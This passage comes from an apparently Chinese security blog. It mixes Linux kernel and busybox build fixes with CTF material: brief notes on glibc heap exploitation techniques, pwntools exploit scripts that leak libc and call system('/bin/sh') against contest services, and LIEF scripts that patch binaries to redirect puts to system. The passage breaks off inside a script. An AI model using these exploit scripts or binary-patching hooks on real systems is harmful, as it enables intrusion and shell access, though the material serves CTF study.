class="line">37</span><br></pre></td><td class="code"><pre><span class="line">arch/x86/kernel/ptrace.c:1472:17: error: conflicting types for ‘syscall_trace_enter’</span><br><span class="line"> asmregparm long syscall_trace_enter(struct pt_regs *regs)</span><br><span class="line">                 ^</span><br><span class="line">In file included from /home/muhe/linux_kernel/linux-2.6.32.1/arch/x86/include/asm/vm86.h:130:0,</span><br><span class="line">                 from /home/muhe/linux_kernel/linux-2.6.32.1/arch/x86/include/asm/processor.h:10,</span><br><span class="line">                 from /home/muhe/linux_kernel/linux-2.6.32.1/arch/x86/include/asm/thread_info.h:22,</span><br><span class="line">                 from include/linux/thread_info.h:56,</span><br><span class="line">                 from include/linux/preempt.h:9,</span><br><span class="line">                 from include/linux/spinlock.h:50,</span><br><span class="line">                 from include/linux/seqlock.h:29,</span><br><span class="line">                 from include/linux/time.h:8,</span><br><span class="line">                 from include/linux/timex.h:56,</span><br><span class="line">                 from include/linux/sched.h:56,</span><br><span class="line">                 from arch/x86/kernel/ptrace.c:11:</span><br><span class="line">/home/muhe/linux_kernel/linux-2.6.32.1/arch/x86/include/asm/ptrace.h:145:13: note: previous declaration of ‘syscall_trace_enter’ was here</span><br><span class="line"> extern long syscall_trace_enter(struct pt_regs *);</span><br><span class="line">             ^</span><br><span class="line">arch/x86/kernel/ptrace.c:1517:17: error: conflicting types for ‘syscall_trace_leave’</span><br><span class="line"> asmregparm void syscall_trace_leave(struct pt_regs *regs)</span><br><span class="line">                 ^</span><br><span class="line">In file included from /home/muhe/linux_kernel/linux-2.6.32.1/arch/x86/include/asm/vm86.h:130:0,</span><br><span class="line">                 from /home/muhe/linux_kernel/linux-2.6.32.1/arch/x86/include/asm/processor.h:10,</span><br><span class="line">                 from /home/muhe/linux_kernel/linux-2.6.32.1/arch/x86/include/asm/thread_info.h:22,</span><br><span class="line">                 from include/linux/thread_info.h:56,</span><br><span class="line">                 from include/linux/preempt.h:9,</span><br><span class="line">                 from include/linux/spinlock.h:50,</span><br><span class="line">                 from include/linux/seqlock.h:29,</span><br><span class="line">                 from include/linux/time.h:8,</span><br><span class="line">                 from include/linux/timex.h:56,</span><br><span class="line">                 from include/linux/sched.h:56,</span><br><span class="line">                 from arch/x86/kernel/ptrace.c:11:</span><br><span class="line">/home/muhe/linux_kernel/linux-2.6.32.1/arch/x86/include/asm/ptrace.h:146:13: note: previous declaration of ‘syscall_trace_leave’ was here</span><br><span class="line"> extern void syscall_trace_leave(struct pt_regs *);</span><br><span class="line">             ^</span><br><span class="line">make[2]: *** [arch/x86/kernel/ptrace.o] 错误 1</span><br><span class="line">make[1]: *** [arch/x86/kernel] 错误 2</span><br><span class="line">make: *** [arch/x86] 错误 2</span><br></pre></td></tr></table></figure>
<p>解决方案<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">--- linux-2.6.32.59/arch/x86/include/asm/ptrace.h</span><br><span class="line">+++ fix_ptrace.o_compile_error/arch/x86/include/asm/ptrace.h</span><br><span class="line">@@ -130,6 +130,7 @@ </span><br><span class="line"> #ifdef __KERNEL__</span><br><span class="line"> </span><br><span class="line"> #include &lt;linux/init.h&gt;</span><br><span class="line">+#include &lt;linux/linkage.h&gt;</span><br><span class="line"> </span><br><span class="line"> struct cpuinfo_x86;</span><br><span class="line"> struct task_struct;</span><br><span class="line">@@ -142,8 +143,8 @@ </span><br><span class="line">       int error_code, int si_code);</span><br><span class="line"> void signal_fault(struct pt_regs *regs, void __user *frame, char *where);</span><br><span class="line"> </span><br><span class="line">-extern long syscall_trace_enter(struct pt_regs *);</span><br><span class="line">-extern void syscall_trace_leave(struct pt_regs *);</span><br><span class="line">+extern asmregparm long syscall_trace_enter(struct pt_regs *);</span><br><span class="line">+extern asmregparm void syscall_trace_leave(struct pt_regs *);</span><br><span class="line"> </span><br><span class="line"> static inline unsigned long regs_return_value(struct pt_regs *regs)</span><br><span class="line"> &#123;&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="3-3-问题3"><a href="#3-3-问题3" class="headerlink" title="3.3 问题3"></a>3.3 问题3</h2><p>问题描述</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc: error: elf_i386: 没有那个文件或目录</span><br><span class="line">gcc: error: unrecognized command line option ‘-m’</span><br></pre></td></tr></table></figure>
<p>解决方案</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">arch/x86/vdso/Makefile</span><br><span class="line">VDSO_LDFLAGS_vdso.lds = -m elf_x86_64 -Wl,-soname=linux-vdso.so.1    -Wl,-z,max-page-size=4096 -Wl,-z,common-page-size=4096 把&quot;-m elf_x86_64&quot; 替换为 &quot;-m64&quot;</span><br><span class="line">VDSO_LDFLAGS_vdso32.lds = -m elf_i386 -Wl,-soname=linux-gate.so.1中的 &quot;-m elf_i386&quot; 替换为 &quot;-m32&quot;</span><br></pre></td></tr></table></figure>
<h2 id="问题4"><a href="#问题4" class="headerlink" title="问题4"></a>问题4</h2><p>问题描述<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">drivers/net/igbvf/igbvf.h15: error: duplicate member ‘page’</span><br><span class="line">struct page page;</span><br><span class="line">^</span><br><span class="line">make[3]: ** [drivers/net/igbvf/ethtool.o] 错误 1</span><br><span class="line">make[2]: [drivers/net/igbvf] 错误 2</span><br><span class="line">make[1]: [drivers/net] 错误 2</span><br><span class="line">make: * [drivers] 错误 2</span><br></pre></td></tr></table></figure></p>
<p>解决方案<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//修改名字重复</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">                    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *_<span class="title">page</span>;</span></span><br><span class="line">                    u64 page_dma;</span><br><span class="line">                    <span class="keyword">unsigned</span> <span class="keyword">int</span> page_offset;</span><br><span class="line">            &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="busybox编译问题"><a href="#busybox编译问题" class="headerlink" title="busybox编译问题"></a>busybox编译问题</h2><h3 id="2-1-问题一以及解决方案"><a href="#2-1-问题一以及解决方案" class="headerlink" title="2.1 问题一以及解决方案"></a>2.1 问题一以及解决方案</h3><p>错误<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  loginutils/passwd.c:188:12: error: ‘RLIMIT_FSIZE’ undeclared (first use in this function)</span><br><span class="line">setrlimit(RLIMIT_FSIZE, &amp;rlimit_fsize);</span><br></pre></td></tr></table></figure></p>
<p>解决<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$  vim include/libbb.h</span><br><span class="line">$  add a line #include &lt;sys/resource.h&gt;</span><br><span class="line">#include &lt;sys/mman.h&gt;</span><br><span class="line">#include &lt;sys/resource.h&gt;</span><br><span class="line">#include &lt;sys/socket.h&gt;</span><br></pre></td></tr></table></figure></p>
<h3 id="问题二以及解决方案"><a href="#问题二以及解决方案" class="headerlink" title="问题二以及解决方案"></a>问题二以及解决方案</h3><p>错误<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">linux/ext2_fs.h: 没有那个文件或目录</span><br></pre></td></tr></table></figure></p>
<p>解决<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Linux System Utilities ---&gt;</span><br><span class="line">    [ ] mkfs_ext2 </span><br><span class="line">    [ ] mkfs_vfat</span><br></pre></td></tr></table></figure></p>

      
    </div>
    
    <footer>
        <div class="alignright">
          
          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
        </div>
        
        
        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2018-07-07T07:58:18.000Z"><a href="/2018/07/07/堆溢出/">2018-07-07</a></time>
      
      
  
    <h1 class="title"><a href="/2018/07/07/堆溢出/">堆溢出</a></h1>
  

    </header>
    <div class="entry">
      
        <p>House of Prime<br>House of Mind<br>House of Force<br>House of Lore<br>House of Spirit<br>House of Mind</p>
<h1 id="House-of-Mind"><a href="#House-of-Mind" class="headerlink" title="House of Mind"></a>House of Mind</h1><p>这个技巧中，攻击者欺骗 glibc malloc 来使用由他伪造的 arena。伪造的 arena 以这种形式构造，unsorted bin 的 fd 包含free的 GOT 条目地址 -12。因此现在当漏洞程序释放某个块的时候，free的 GOT 条目被覆盖为 shellcode 的地址。在成功覆盖 GOT 之后，当漏洞程序调用free，shellcode 就会执行。</p>
<h1 id="House-of-Force"><a href="#House-of-Force" class="headerlink" title="House of Force"></a>House of Force</h1><p>这个技巧中，攻击者滥用 top 块的大小，并欺骗 glibc malloc 使用 top 块来服务于一个非常大的内存请求（大于堆系统内存大小）。现在当新的 malloc 请求产生时，free的 GOT 表就会覆盖为 shellcode 地址。因此从现在开始，无论free何时调用，shellcode 都会执行。</p>
<h1 id="House-of-Force-1"><a href="#House-of-Force-1" class="headerlink" title="House of Force"></a>House of Force</h1><p>这个技巧中，攻击者滥用 top 块的大小，并欺骗 glibc malloc 使用 top 块来服务于一个非常大的内存请求（大于堆系统内存大小）。现在当新的 malloc 请求产生时，free的 GOT 表就会覆盖为 shellcode 地址。因此从现在开始，无论free何时调用，shellcode 都会执行。</p>
<h1 id="House-of-Spirit"><a href="#House-of-Spirit" class="headerlink" title="House of Spirit"></a>House of Spirit</h1><p>在这个技巧中，攻击者欺骗 glibc malloc 来返回一个块，它位于栈中（而不是堆中）。这允许攻击者覆盖储存在栈中的返回地址。</p>

      
    </div>
    
    <footer>
        <div class="alignright">
          
          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
        </div>
        
        
        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2018-07-07T07:58:18.000Z"><a href="/2018/07/07/文件读写内存实例/">2018-07-07</a></time>
      
      
  
    <h1 class="title"><a href="/2018/07/07/文件读写内存实例/">文件读写内存实例</a></h1>
  

    </header>
    <div class="entry">
      
        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># level 3</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">14</span>):</span><br><span class="line">attack()</span><br><span class="line">change_host()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line"><span class="keyword">if</span> LOCAL:</span><br><span class="line">io2 = process(<span class="string">'./play'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">io2 = remote(<span class="string">'47.104.90.157'</span>, <span class="number">30003</span>)</span><br><span class="line">name = <span class="string">'B1rd'</span></span><br><span class="line">io2.recvuntil(<span class="string">'login:'</span>)</span><br><span class="line">io2.sendline(name)</span><br><span class="line">io2.recvuntil(<span class="string">'choice&gt;&gt; '</span>)</span><br><span class="line">io2.close()</span><br><span class="line">hacking(<span class="number">1</span>)</span><br><span class="line">attack2()</span><br><span class="line">io.recvuntil(<span class="string">'what\'s your name:'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./play'</span>)</span><br><span class="line">io.sendline(<span class="string">'A'</span> * <span class="number">0x4c</span> + p32(elf.plt[<span class="string">'write'</span>]) + p32(<span class="number">0x80492C0</span>) + p32(<span class="number">1</span>) +</span><br><span class="line">p32(elf.got[<span class="string">'read'</span>]) + p32(<span class="number">4</span>))</span><br><span class="line">io.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">libc_addr = u32(io.recvn(<span class="number">4</span>)) - libc.symbols[<span class="string">'read'</span>]</span><br><span class="line">log.info(<span class="string">'libc_addr:%#x'</span> % libc_addr)</span><br><span class="line">system_addr = libc_addr + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">bin_sh = libc_addr + next(libc.search(<span class="string">'/bin/sh'</span>))</span><br><span class="line">log.info(<span class="string">'system_addr:%#x'</span> % system_addr)</span><br><span class="line">log.info(<span class="string">'bin_sh:%#x'</span> % bin_sh)</span><br><span class="line">attack2()</span><br><span class="line">io.recvuntil(<span class="string">'what\'s your name:'</span>)</span><br><span class="line">io.sendline(<span class="string">'A'</span> * <span class="number">0x4c</span> + p32(system_addr) + p32(<span class="number">0</span>) + p32(bin_sh))</span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">LOCAL = <span class="number">0</span></span><br><span class="line">DEBUG = <span class="number">1</span></span><br><span class="line">VERBOSE = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> VERBOSE:</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="keyword">if</span> LOCAL:</span><br><span class="line">io = process(<span class="string">'./fileManager'</span>, aslr=<span class="keyword">False</span>, env=&#123;<span class="string">'LD_PRELOAD'</span>:</span><br><span class="line"><span class="string">'./libc.so.6'</span>&#125;)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">gdb.attach(io, <span class="string">'b *0x56555F2C\n'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">io = remote(<span class="string">'47.104.188.138'</span>, <span class="number">30007</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_mod</span><span class="params">(name, offset, size)</span>:</span></span><br><span class="line">io.recvuntil(<span class="string">'\x87\xba\n'</span>)</span><br><span class="line">io.sendline(<span class="string">'1'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'\xa7\xb0\x3a'</span>)</span><br><span class="line">io.sendline(name)</span><br><span class="line">io.recvuntil(<span class="string">'\x87\x8f\x3a'</span>)</span><br><span class="line">io.sendline(str(offset))</span><br><span class="line">io.recvuntil(<span class="string">'\xb0\x8f\x3a'</span>)</span><br><span class="line">io.sendline(str(size))</span><br><span class="line">io.recvuntil(<span class="string">'\xae\xb9'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_mod</span><span class="params">(name, offset, size, content)</span>:</span></span><br><span class="line">io.recvuntil(<span class="string">'\x87\xba\n'</span>)</span><br><span class="line">io.sendline(<span class="string">'2'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'\xa7\xb0\x3a'</span>)</span><br><span class="line">io.sendline(name)</span><br><span class="line">io.recvuntil(<span class="string">'\x87\x8f\x3a'</span>)</span><br><span class="line">io.sendline(str(offset))</span><br><span class="line">io.recvuntil(<span class="string">'\xb0\x8f\x3a'</span>)</span><br><span class="line">io.sendline(str(size))</span><br><span class="line">io.recvuntil(<span class="string">'\x9d\x97\x3a'</span>)</span><br><span class="line">io.send(content)</span><br><span class="line">name = <span class="string">'B1rd'</span></span><br><span class="line">io.recvuntil(<span class="string">'FTP:'</span>)</span><br><span class="line">io.sendline(name)</span><br><span class="line">read_mod(<span class="string">'/proc/self/maps'</span>, <span class="number">0</span>, <span class="number">0x100</span>)</span><br><span class="line">elf_base = int(io.recvn(<span class="number">8</span>), <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">'elf_base:%#x'</span> % elf_base)</span><br><span class="line">elf = ELF(<span class="string">'fileManager'</span>)</span><br><span class="line">read_mod(<span class="string">'/proc/self/mem'</span>, elf_base + elf.got[<span class="string">'open'</span>], <span class="number">0x100</span>)</span><br><span class="line">libc_addr = u32(io.recvn(<span class="number">4</span>)) - libc.symbols[<span class="string">'open'</span>]</span><br><span class="line">system_addr = libc_addr + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">log.info(<span class="string">'libc_addr:%#x'</span> % libc_addr)</span><br><span class="line">log.info(<span class="string">'system_addr:%#x'</span> % system_addr)</span><br></pre></td></tr></table></figure>
      
    </div>
    
    <footer>
        <div class="alignright">
          
          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
        </div>
        
        
        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2018-07-07T07:58:18.000Z"><a href="/2018/07/07/线下赛/">2018-07-07</a></time>
      
      
  
    <h1 class="title"><a href="/2018/07/07/线下赛/">线下赛</a></h1>
  

    </header>
    <div class="entry">
      
        <h1 id="LIEF"><a href="#LIEF" class="headerlink" title="LIEF"></a>LIEF</h1><h2 id="通过交换导入导出符号"><a href="#通过交换导入导出符号" class="headerlink" title="通过交换导入导出符号"></a>通过交换导入导出符号</h2><p>首先看第一个测试程序：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"/bin/sh"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们的目标是让他调用 puts 变成调用 system</p>
<h2 id="方案一"><a href="#方案一" class="headerlink" title="方案一"></a>方案一</h2><p>修改 libc 中的相关符号，然后使用 LD_LIBRARY_PATH 加载我们修改后的库。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> lief</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">hashme = lief.parse(<span class="string">"hashme"</span>)</span><br><span class="line"></span><br><span class="line">libc = lief.parse(<span class="string">"/lib/x86_64-linux-gnu/libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="comment"># get puts, system symbol</span></span><br><span class="line"></span><br><span class="line">puts_sym = filter(<span class="keyword">lambda</span> e: e.name == <span class="string">"puts"</span>, libc.dynamic_symbols)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">system_sym = filter(<span class="keyword">lambda</span> e: e.name == <span class="string">"system"</span>, libc.dynamic_symbols)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="comment"># swap them</span></span><br><span class="line"></span><br><span class="line">puts_sym.name = <span class="string">"system"</span></span><br><span class="line"></span><br><span class="line">system_sym.name = <span class="string">"puts"</span></span><br><span class="line"></span><br><span class="line">libc.write(<span class="string">"libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">print(<span class="string">"done"</span>)</span><br></pre></td></tr></table></figure>
<h2 id="方案二"><a href="#方案二" class="headerlink" title="方案二"></a>方案二</h2><p>直接修改目标文件的导入符号，代码如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> lief</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">hashme = lief.parse(<span class="string">"hashme"</span>)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="comment"># get puts, system symbol</span></span><br><span class="line"></span><br><span class="line">puts_sym = filter(<span class="keyword">lambda</span> e: e.name == <span class="string">"puts"</span>, hashme.imported_symbols)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="comment"># set puts to system</span></span><br><span class="line"></span><br><span class="line">puts_sym.name = <span class="string">"system"</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">hashme.write(<span class="string">"hashme.patch"</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"done"</span>)</span><br></pre></td></tr></table></figure>
<p>直接增加代码进行patch<br>修改库函数<br>测试程序：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (argc != <span class="number">2</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Usage: %s &lt;a&gt; \n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> a = atoi(argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"exp(%d) = %f\n"</span>, a, <span class="built_in">exp</span>(a));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>目标是hook exp 函数，直接增加一个 segments ,<br> 然后劫持函数指针到这里。首先编译一个 lib 用来提供用于 hook 的代码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -Os -nostdlib -nodefaultlibs -fPIC -Wl,-shared hook.c -o hook</span><br></pre></td></tr></table></figure>
<p>hook.c 的内容：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">hook</span><span class="params">(<span class="keyword">double</span> x)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> x + <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后看脚本内容，很清晰。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> lief</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">libm = lief.parse(<span class="string">"/lib/x86_64-linux-gnu/libm-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line">hook = lief.parse(<span class="string">"hook"</span>)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">segment_added = libm.add(hook.segments[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">print(<span class="string">"Hook inserted at VA: 0x&#123;:06x&#125;"</span>.format(segment_added.virtual_address))</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">exp_symbol = libm.get_symbol(<span class="string">"exp"</span>)</span><br><span class="line"></span><br><span class="line">hook_symbol = hook.get_symbol(<span class="string">"hook"</span>)</span><br><span 